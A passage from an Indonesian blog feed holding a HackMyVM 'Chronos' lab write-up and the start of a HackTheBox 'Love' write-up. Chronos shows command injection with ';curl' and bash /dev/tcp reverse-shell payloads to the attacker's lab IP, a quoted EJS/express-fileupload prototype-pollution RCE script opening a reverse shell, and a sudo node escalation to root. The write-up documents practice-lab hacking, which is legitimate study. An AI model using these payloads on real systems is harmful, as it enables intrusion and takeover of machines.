class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">797116soVTES</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">onreadystatechange</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">User-Agent</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">status</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">1DYOODT</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">400909Mbbcfr</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">Chronos</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">2QRBPWS</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">getElementById</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">innerHTML</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">date</span><span class="dl">'</span><span class="p">];(</span><span class="kd">function</span><span class="p">(</span><span class="nx">_0x506b95</span><span class="p">,</span><span class="nx">_0x817e36</span><span class="p">){</span><span class="kd">var</span> <span class="nx">_0x244260</span><span class="o">=</span><span class="nx">_0x432d</span><span class="p">;</span><span class="k">while</span><span class="p">(</span><span class="o">!!</span><span class="p">[]){</span><span class="k">try</span><span class="p">{</span><span class="kd">var</span> <span class="nx">_0x35824b</span><span class="o">=-</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">_0x244260</span><span class="p">(</span><span class="mh">0x7e</span><span class="p">))</span><span class="o">*</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">_0x244260</span><span class="p">(</span><span class="mh">0x90</span><span class="p">))</span><span class="o">+</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">_0x244260</span><span class="p">(</span><span class="mh">0x8e</span><span class="p">))</span><span class="o">+</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">_0x244260</span><span class="p">(</span><span class="mh">0x7f</span><span class="p">))</span><span class="o">*</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">_0x244260</span><span class="p">(</span><span class="mh">0x83</span><span class="p">))</span><span class="o">+-</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">_0x244260</span><span class="p">(</span><span class="mh">0x87</span><span class="p">))</span><span class="o">+-</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">_0x244260</span><span class="p">(</span><span class="mh">0x82</span><span class="p">))</span><span class="o">*</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">_0x244260</span><span class="p">(</span><span class="mh">0x8d</span><span class="p">))</span><span class="o">+-</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">_0x244260</span><span class="p">(</span><span class="mh">0x88</span><span class="p">))</span><span class="o">+</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">_0x244260</span><span class="p">(</span><span class="mh">0x80</span><span class="p">))</span><span class="o">*</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">_0x244260</span><span class="p">(</span><span class="mh">0x84</span><span class="p">));</span><span class="k">if</span><span class="p">(</span><span class="nx">_0x35824b</span><span class="o">===</span><span class="nx">_0x817e36</span><span class="p">)</span><span class="k">break</span><span class="p">;</span><span class="k">else</span> <span class="nx">_0x506b95</span><span class="p">[</span><span class="dl">'</span><span class="s1">push</span><span class="dl">'</span><span class="p">](</span><span class="nx">_0x506b95</span><span class="p">[</span><span class="dl">'</span><span class="s1">shift</span><span class="dl">'</span><span class="p">]());}</span><span class="k">catch</span><span class="p">(</span><span class="nx">_0x3fb1dc</span><span class="p">){</span><span class="nx">_0x506b95</span><span class="p">[</span><span class="dl">'</span><span class="s1">push</span><span class="dl">'</span><span class="p">](</span><span class="nx">_0x506b95</span><span class="p">[</span><span class="dl">'</span><span class="s1">shift</span><span class="dl">'</span><span class="p">]());}}}(</span><span class="nx">_0x5bdf</span><span class="p">,</span><span class="mh">0xcaf1e</span><span class="p">));</span><span class="kd">function</span> <span class="nx">_0x432d</span><span class="p">(</span><span class="nx">_0x16bd66</span><span class="p">,</span><span class="nx">_0x33ffa9</span><span class="p">){</span><span class="k">return</span> <span class="nx">_0x432d</span><span class="o">=</span><span class="kd">function</span><span class="p">(</span><span class="nx">_0x5bdf82</span><span class="p">,</span><span class="nx">_0x432dc8</span><span class="p">){</span><span class="nx">_0x5bdf82</span><span class="o">=</span><span class="nx">_0x5bdf82</span><span class="o">-</span><span class="mh">0x7e</span><span class="p">;</span><span class="kd">var</span> <span class="nx">_0x4da6e8</span><span class="o">=</span><span class="nx">_0x5bdf</span><span class="p">[</span><span class="nx">_0x5bdf82</span><span class="p">];</span><span class="k">return</span> <span class="nx">_0x4da6e8</span><span class="p">;},</span><span class="nx">_0x432d</span><span class="p">(</span><span class="nx">_0x16bd66</span><span class="p">,</span><span class="nx">_0x33ffa9</span><span class="p">);}</span><span class="kd">function</span> <span class="nx">loadDoc</span><span class="p">(){</span><span class="kd">var</span> <span class="nx">_0x17df92</span><span class="o">=</span><span class="nx">_0x432d</span><span class="p">,</span><span class="nx">_0x1cff55</span><span class="o">=</span><span class="nx">_0x17df92</span><span class="p">(</span><span class="mh">0x8f</span><span class="p">),</span><span class="nx">_0x2beb35</span><span class="o">=</span><span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span><span class="nx">_0x2beb35</span><span class="p">[</span><span class="nx">_0x17df92</span><span class="p">(</span><span class="mh">0x89</span><span class="p">)]</span><span class="o">=</span><span class="kd">function</span><span class="p">(){</span><span class="kd">var</span> <span class="nx">_0x146f5d</span><span class="o">=</span><span class="nx">_0x17df92</span><span class="p">;</span><span class="k">this</span><span class="p">[</span><span class="nx">_0x146f5d</span><span class="p">(</span><span class="mh">0x85</span><span class="p">)]</span><span class="o">==</span><span class="mh">0x4</span><span class="o">&amp;&amp;</span><span class="k">this</span><span class="p">[</span><span class="nx">_0x146f5d</span><span class="p">(</span><span class="mh">0x8c</span><span class="p">)]</span><span class="o">==</span><span class="mh">0xc8</span><span class="o">&amp;&amp;</span><span class="p">(</span><span class="nb">document</span><span class="p">[</span><span class="nx">_0x146f5d</span><span class="p">(</span><span class="mh">0x91</span><span class="p">)](</span><span class="nx">_0x146f5d</span><span class="p">(</span><span class="mh">0x93</span><span class="p">))[</span><span class="nx">_0x146f5d</span><span class="p">(</span><span class="mh">0x92</span><span class="p">)]</span><span class="o">=</span><span class="k">this</span><span class="p">[</span><span class="nx">_0x146f5d</span><span class="p">(</span><span class="mh">0x86</span><span class="p">)]);},</span><span class="nx">_0x2beb35</span><span class="p">[</span><span class="nx">_0x17df92</span><span class="p">(</span><span class="mh">0x81</span><span class="p">)](</span><span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">,</span><span class="nx">_0x17df92</span><span class="p">(</span><span class="mh">0x8a</span><span class="p">),</span><span class="o">!!</span><span class="p">[]),</span><span class="nx">_0x2beb35</span><span class="p">[</span><span class="dl">'</span><span class="s1">setRequestHeader</span><span class="dl">'</span><span class="p">](</span><span class="nx">_0x17df92</span><span class="p">(</span><span class="mh">0x8b</span><span class="p">),</span><span class="nx">_0x1cff55</span><span class="p">),</span><span class="nx">_0x2beb35</span><span class="p">[</span><span class="dl">'</span><span class="s1">send</span><span class="dl">'</span><span class="p">]();}</span>

</code></pre></div></div>
<p>tanpa melihat renderan dari port 80, dari source web sendiri terlihat aneh dibagian script. disana ditujukan ke <strong>http://chronos.local</strong>. Ok host baru yang harus dibuat di <em>/etc/hosts</em>.</p>

<h2 id="directory-brute-forcing">Directory Brute-forcing</h2>

<p>dari <strong>gobuster</strong> sampai <strong>dirsearch</strong>. Result yang saya dapatkan selalu seperti ini.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/css                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 312] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://chronos.local/css/]
/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278]
</code></pre></div></div>
<p>Karna baru tingkat emosi habis ada masalah hidup, jadi hilang konsen. saya lupa kalo ada port 8000 yang terbuka, hehe. jadi tidak ada yang menarik for this part.</p>

<h2 id="escalate-as-www-data">Escalate as www-data</h2>
<p>PS: rada ribet.</p>

<p>Karna tadi, domain host berubah dan dibagian URL terlihat seperti query. saya mencoba untuk melihat source dari <strong>http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ</strong> menggunakan <strong>curl</strong> lagi.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>arin@aoba ~/Desktop/boot2roots/hmv/chronos <span class="nv">$ </span>curl http://chronos.local:8000/date<span class="se">\?</span>format<span class="se">\=</span>4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL
Permission Denied%

</code></pre></div></div>
<p>Loh, permission denied?. saya coba liat lagi code javascript yang menurut saya terlihat seperti sudah diobfuscate. ada code seperti ini.</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">'User-Agent','status','</span><span class="mi">1</span><span class="err">DYOODT','</span><span class="mi">400909</span><span class="err">Mbbcfr','Chronos','</span><span class="mi">2</span><span class="err">QRBPWS','getElementById','innerHTML','date'</span><span class="w">
</span></code></pre></div></div>
<p>Dari kedua ini, saya menyimpulkan bahwa format ini adalah tanggal yang dibuat menjadi cipher text.</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;body</span> <span class="na">onload=</span><span class="s">"loadDoc()"</span><span class="nt">&gt;</span>

  <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"wrapper"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"future-cop"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;h3</span> <span class="na">class=</span><span class="s">"future"</span><span class="nt">&gt;</span>Chronos - Date <span class="err">&amp;</span> Time<span class="nt">&lt;/h3&gt;</span>
      <span class="nt">&lt;h1</span> <span class="na">class=</span><span class="s">"cop"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;p</span> <span class="na">id=</span><span class="s">"date"</span><span class="nt">&gt;&lt;/p&gt;</span>
      <span class="nt">&lt;/h1&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;script&gt;</span>
</code></pre></div></div>
<p>Saya ke <a href="https://dcode.fr/">https://dcode.fr/</a> mencoba untuk mengindentifikasi bentuk cipher ini. ternyata <strong>base-58</strong>. saya coba <strong>curl</strong> (apa sih ga tau nama istilahnya hehe) dengan mengoverwrite <strong>User-Agent: Chronos</strong> seperti yang ada di bagian JS yang diobfuscate tadi.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>arin@aoba ~/Desktop/boot2roots/hmv/chronos <span class="nv">$ </span>curl http://chronos.local:8000/date<span class="se">\?</span>format<span class="se">\=</span>4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL <span class="nt">-H</span> <span class="s2">"User-Agent: Chronos"</span>
Today is Thursday, September 16, 2021 08:37:10.

</code></pre></div></div>
<p>Benerkan tanggal. Ok sampai sini saya berfikir bagaimana jika reverse shell diencrypt dengan base-58? tapi saya test dulu.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">;</span>curl http://192.168.56.1:2004
-&gt; uXN49Jdw8oBXUxPfRopqnHUK4jLyKTxw8o4Bci6KVQ
<span class="nt">---</span>
arin@aoba ~/Desktop/boot2roots/hmv/chronos <span class="nv">$ </span>curl http://chronos.local:8000/date<span class="se">\?</span>format<span class="se">\=</span>uXN49Jdw8oBXUxPfRopqnHUK4jLyKTxw8o4Bci6KVQ <span class="nt">-H</span> <span class="s2">"User-Agent: Chronos"</span>
<span class="nt">---</span>
arin@aoba ~ <span class="nv">$ </span>ncat <span class="nt">-nvlp</span> 2004
Ncat: Version 7.92 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
Ncat: Listening on :::2004
Ncat: Listening on 0.0.0.0:2004
Ncat: Connection from 192.168.56.108.
Ncat: Connection from 192.168.56.108:33704.
GET / HTTP/1.1
Host: 192.168.56.1:2004
User-Agent: curl/7.58.0
Accept: <span class="k">*</span>/<span class="k">*</span>

</code></pre></div></div>
<p>OK REVERSE SHELL, GET IT.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">;</span>bash <span class="nt">-c</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/192.168.56.1/4242 0&gt;&amp;1'</span>
-&gt;25v919hbfMQqCv6QfhvvBc5iYdGcDgqbbt85MB6wUQfjQoec4PBgYon4cd1pjpVKqj1Ms4kqc
<span class="nt">---</span>
arin@aoba ~/Desktop/boot2roots/hmv/chronos <span class="nv">$ </span>curl http://chronos.local:8000/date<span class="se">\?</span>format<span class="se">\=</span>25v919hbfMQqCv6QfhvvBc5iYdGcDgqbbt85MB6wUQfjQoec4PBgYon4cd1pjpVKqj1Ms4kqc <span class="nt">-H</span> <span class="s2">"User-Agent: Chronos"</span>
<span class="nt">---</span>
arin@aoba ~ <span class="nv">$ </span>ncat <span class="nt">-nvlp</span> 4242
Ncat: Version 7.92 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
Ncat: Listening on :::4242
Ncat: Listening on 0.0.0.0:4242
Ncat: Connection from 192.168.56.108.
Ncat: Connection from 192.168.56.108:55884.
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>771<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
www-data@chronos:/opt/chronos<span class="nv">$ </span><span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
www-data@chronos:/opt/chronos<span class="nv">$ </span>

</code></pre></div></div>

<h2 id="shell-as-imera">Shell as imera</h2>
<p>pergi kemana-mana, akhirnya nemu asik-asik.</p>
<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">www-data@chronos:/opt/chronos-v</span><span class="mi">2</span><span class="err">/backend$</span><span class="w"> </span><span class="err">cat</span><span class="w"> </span><span class="err">package.json</span><span class="w">
</span><span class="p">{</span><span class="w">
  </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"some-website"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"1.0.0"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
  </span><span class="nl">"main"</span><span class="p">:</span><span class="w"> </span><span class="s2">"server.js"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"scripts"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nl">"start"</span><span class="p">:</span><span class="w"> </span><span class="s2">"node server.js"</span><span class="w">
  </span><span class="p">},</span><span class="w">
  </span><span class="nl">"author"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
  </span><span class="nl">"license"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ISC"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"dependencies"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nl">"ejs"</span><span class="p">:</span><span class="w"> </span><span class="s2">"^3.1.5"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"express"</span><span class="p">:</span><span class="w"> </span><span class="s2">"^4.17.1"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"express-fileupload"</span><span class="p">:</span><span class="w"> </span><span class="s2">"^1.1.7-alpha.3"</span><span class="w">
  </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>
<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">www-data@chronos:/opt/chronos-v</span><span class="mi">2</span><span class="err">/backend$</span><span class="w"> </span><span class="err">cat</span><span class="w"> </span><span class="err">server.js</span><span class="w">
</span><span class="err">const</span><span class="w"> </span><span class="err">express</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">require('express');</span><span class="w">
</span><span class="err">const</span><span class="w"> </span><span class="err">fileupload</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">require(</span><span class="s2">"express-fileupload"</span><span class="err">);</span><span class="w">
</span><span class="err">const</span><span class="w"> </span><span class="err">http</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">require('http')</span><span class="w">

</span><span class="err">const</span><span class="w"> </span><span class="err">app</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">express();</span><span class="w">

</span><span class="err">app.use(fileupload(</span><span class="p">{</span><span class="w"> </span><span class="err">parseNested:</span><span class="w"> </span><span class="kc">true</span><span class="w"> </span><span class="p">}</span><span class="err">));</span><span class="w">

</span><span class="err">app.set('view</span><span class="w"> </span><span class="err">engine',</span><span class="w"> </span><span class="err">'ejs');</span><span class="w">
</span><span class="err">app.set('views',</span><span class="w"> </span><span class="s2">"/opt/chronos-v2/frontend/pages"</span><span class="err">);</span><span class="w">

</span><span class="err">app.get('/',</span><span class="w"> </span><span class="err">(req,</span><span class="w"> </span><span class="err">res)</span><span class="w"> </span><span class="err">=&gt;</span><span class="w"> </span><span class="p">{</span><span class="w">
   </span><span class="err">res.render('index')</span><span class="w">
</span><span class="p">}</span><span class="err">);</span><span class="w">

</span><span class="err">const</span><span class="w"> </span><span class="err">server</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">http.Server(app);</span><span class="w">
</span><span class="err">const</span><span class="w"> </span><span class="err">addr</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="s2">"127.0.0.1"</span><span class="w">
</span><span class="err">const</span><span class="w"> </span><span class="err">port</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="mi">8080</span><span class="err">;</span><span class="w">
</span><span class="err">server.listen(port,</span><span class="w"> </span><span class="err">addr,</span><span class="w"> </span><span class="err">()</span><span class="w"> </span><span class="err">=&gt;</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="err">console.log('Server</span><span class="w"> </span><span class="err">listening</span><span class="w"> </span><span class="err">on</span><span class="w"> </span><span class="err">'</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="err">addr</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="err">'</span><span class="w"> </span><span class="err">port</span><span class="w"> </span><span class="err">'</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="err">port);</span><span class="w">
</span></code></pre></div></div>
<p>tidak tahu persis apa maksudnya, tapi saya dapat memahami bagaimana server ini berjalan. saya mencoba googling dan mendapatkan Exploit menarik untuk <a href="https://github.com/boiledsteak/EJS-Exploit">express-fileupload</a>. tidak lebih seperti dibawah ini.</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">##############################################################
# Run this .py to perform EJS-RCE attack
# referenced from
# https://blog.p6.is/Real-World-JS-1/
# 
# Timothy, 10 November 2020
##############################################################
</span>
<span class="c1">### imports
</span><span class="kn">import</span> <span class="nn">requests</span>

<span class="c1">### commands to run on victim machine
</span><span class="n">cmd</span> <span class="o">=</span> <span class="s">'bash -c "bash -i &amp;&gt; /dev/tcp/192.168.56.1/2004 0&gt;&amp;1"'</span>

<span class="k">print</span><span class="p">(</span><span class="s">"Starting Attack..."</span><span class="p">)</span>
<span class="c1">### pollute
</span><span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">'http://127.0.0.1:8080'</span><span class="p">,</span> <span class="n">files</span> <span class="o">=</span> <span class="p">{</span><span class="s">'__proto__.outputFunctionName'</span><span class="p">:</span> <span class="p">(</span>
    <span class="bp">None</span><span class="p">,</span> <span class="sa">f</span><span class="s">"x;console.log(1);process.mainModule.require('child_process').exec('</span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="s">');x"</span><span class="p">)})</span>

<span class="c1">### execute command
</span><span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'http://127.0.0.1:8080'</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Finished!"</span><span class="p">)</span>
</code></pre></div></div>
<p>konsep yang menarik untuk meng-exploit server lokal dan mengeksekusi reverse shell dan masuk ke shell si mesin attacker. and then look what iâ€™ve done with it.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@chronos:~/html<span class="nv">$ </span>python3 exploit.py
python3 exploit.py
Starting Attack...
Finished!
<span class="nt">---</span>
arin@aoba ~/Desktop/boot2roots/hmv/chronos <span class="nv">$ </span>ncat <span class="nt">-nvlp</span> 2004
Ncat: Version 7.92 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
Ncat: Listening on :::2004
Ncat: Listening on 0.0.0.0:2004
Ncat: Connection from 192.168.56.108.
Ncat: Connection from 192.168.56.108:33712.
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>772<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
imera@chronos:/opt/chronos-v2/backend<span class="nv">$ </span><span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>imera<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>imera<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>imera<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,27<span class="o">(</span><span class="nb">sudo</span><span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,108<span class="o">(</span>lxd<span class="o">)</span>
imera@chronos:/opt/chronos-v2/backend<span class="nv">$ </span>

</code></pre></div></div>

<h2 id="privesc">PrivEsc</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>imera@chronos:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>imera on chronos:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User imera may run the following commands on chronos:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/local/bin/npm <span class="k">*</span>
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/local/bin/node <span class="k">*</span>
</code></pre></div></div>
<p>seperti biasa <a href="https://gtfobins.github.com/">GTFObins</a> selalu menyediakan metode untuk para pentester melakukan privesc.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>imera@chronos:~<span class="nv">$ </span><span class="nb">sudo </span>node <span class="nt">-e</span> <span class="s1">'child_process.spawn("/bin/sh", {stdio: [0, 1, 2]})'</span>
<span class="o">)</span><span class="s1">'do node -e '</span>child_process.spawn<span class="o">(</span><span class="s2">"/bin/sh"</span>, <span class="o">{</span>stdio: <span class="o">[</span>0, 1, 2]<span class="o">})</span>

<span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</code></pre></div></div>

<h2 id="references">References</h2>
<ul>
  <li><a href="https://salmonsec.com/cheatsheet/reverse_shells">https://salmonsec.com/cheatsheet/reverse_shells</a></li>
  <li><a href="https://www.dcode.fr/base-58-cipher">https://www.dcode.fr/base-58-cipher</a></li>
  <li><a href="https://ibreak.software/2016/08/nodejs-rce-and-a-simple-reverse-shell/">https://ibreak.software/2016/08/nodejs-rce-and-a-simple-reverse-shell/</a></li>
  <li><a href="https://dev.to/boiledsteak/simple-remote-code-execution-on-ejs-web-applications-with-express-fileupload-3325">https://dev.to/boiledsteak/simple-remote-code-execution-on-ejs-web-applications-with-express-fileupload-3325</a></li>
  <li><a href="https://github.com/boiledsteak/EJS-Exploit">https://github.com/boiledsteak/EJS-Exploit</a></li>
</ul>]]></content><author><name></name></author><category term="hackmyvm" /><category term="nodejs" /><category term="express-fileupload" /><category term="CVE-2020-7699" /><category term="RCE-PoC" /><category term="base-56-cipher" /><summary type="html"><![CDATA[Habis dipusingin sama soal binary exploit di picoctf jadi kangen main boot2root di HackMyVM dan juga kangen nulis writeup di blog, apalagi HMV udah jarang saya tulis. yang kemaren aja machine box easy semua, hehe. Saya juga udah jarang nulis note kalo habis dapet ilmu baru entah karena apa tapi kurang lebih rasa males yang menghantui pikiran saya. Saya juga mikir â€œbuat apa juga nulis di blog kalo di internet banyak note orang, tinggal dibookmark aja kan gampangâ€. Kurang lebih pikiran itu yang merusak segala visi misi saya.]]></summary></entry><entry><title type="html">HackTheBox: Love</title><link href="http://localhost:4000/htb-love" rel="alternate" type="text/html" title="HackTheBox: Love" /><published>2021-08-08T04:03:26+07:00</published><updated>2021-08-08T04:03:26+07:00</updated><id>http://localhost:4000/htb-love</id><content type="html" xml:base="http://localhost:4000/htb-love"><![CDATA[<p><strong>Love</strong> adalah machine yang dirilis dengan sistem operasi Windows dengan tingkat kesulitan <em>Easy</em>. menggunakan SSRF untuk mendapatkan akses terhadap Webpage yang hanya diizinkan untuk diperlihatkan oleh localhost credentials. lalu meng-exploit sebuah vulnerability upload dalam Voting System untuk mendapatkan Remote Code Execution (RCE). berkat Enumeration, akhirnya <strong>AlwaysInstallElevated</strong> setting bisa didapatkan untuk mendapatkan system shell.</p>

<h2 id="machine-information">Machine Information</h2>

<table>
  <tbody>
    <tr>
      <td><strong>Details</strong></td>
      <td>Â </td>
    </tr>
    <tr>
      <td>Name of Machine</td>
      <td><strong>Love</strong></td>
    </tr>
    <tr>
      <td>Difficulty Level</td>
      <td><strong>Easy</strong></td>
    </tr>
    <tr>
      <td>Date Released</td>
      <td><strong>01 May 2021</strong></td>
    </tr>
    <tr>
      <td>Date Retired</td>
      <td><strong>07 Aug 2021</strong></td>
    </tr>
    <tr>
      <td>Date I Complete It</td>
      <td><strong>15 Juny 2021</strong></td>
    </tr>
    <tr>
      <td>Radar Graph</td>
      <td><img src="https://i.postimg.cc/d0yGDN6h/download.png" alt="gambar" /></td>
    </tr>
  </tbody>
</table>

<h2 id="table-of-contents">Table of contents</h2>

<ul>
  <li><a href="#recon">Recon</a>
    <ul>
      <li><a href="#ports">Ports</a></li>
      <li><a href="#smb">SMB - TCP 445</a></li>
      <li><a href="#mysql">MySQL -TCP 3306</a></li>
      <li><a href="#unknown">Unknown services - TCP 5080 and 7680</a></li>
      <li><a href="#http443">HTTP - TCP 443 and 5000</a></li>
      <li><a href="#http80">HTTP - TCP 80</a></li>
      <li><a href="#staging">staging.love.htb</a></li>
    </ul>
  </li>
  <li><a href="#phoebee">Shell as phoebee</a>
    <ul>
      <li><a href="#SSRF">SSRF</a></li>
      <li><a href="#RCE">RCE</a></li>
    </ul>
  </li>
  <li><a href="#privesc">Shell as System</a></li>
</ul>

<h2 id="recon">Recon</h2>
<h2 id="ports">Ports</h2>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PORT</span>      <span class="n">STATE</span> <span class="n">SERVICE</span>      <span class="n">REASON</span>  <span class="n">VERSION</span>
<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span>    <span class="n">open</span>  <span class="n">http</span>         <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">Apache</span> <span class="n">httpd</span> <span class="mf">2.4.46</span> <span class="p">((</span><span class="n">Win64</span><span class="p">)</span> <span class="n">OpenSSL</span><span class="o">/</span><span class="mf">1.1.1</span><span class="n">j</span> <span class="n">PHP</span><span class="o">/</span><span class="mf">7.3.27</span><span class="p">)</span>
<span class="o">|</span> <span class="n">http</span><span class="o">-</span><span class="n">cookie</span><span class="o">-</span><span class="n">flags</span><span class="o">:</span> 
<span class="o">|</span>   <span class="o">/:</span> 
<span class="o">|</span>     <span class="n">PHPSESSID</span><span class="o">:</span> 
<span class="o">|</span><span class="n">_</span>      <span class="n">httponly</span> <span class="n">flag</span> <span class="n">not</span> <span class="n">set</span>
<span class="o">|</span> <span class="n">http</span><span class="o">-</span><span class="n">methods</span><span class="o">:</span> 
<span class="o">|</span><span class="n">_</span>  <span class="n">Supported</span> <span class="n">Methods</span><span class="o">:</span> <span class="n">POST</span>
<span class="mi">135</span><span class="o">/</span><span class="n">tcp</span>   <span class="n">open</span>  <span class="n">msrpc</span>        <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
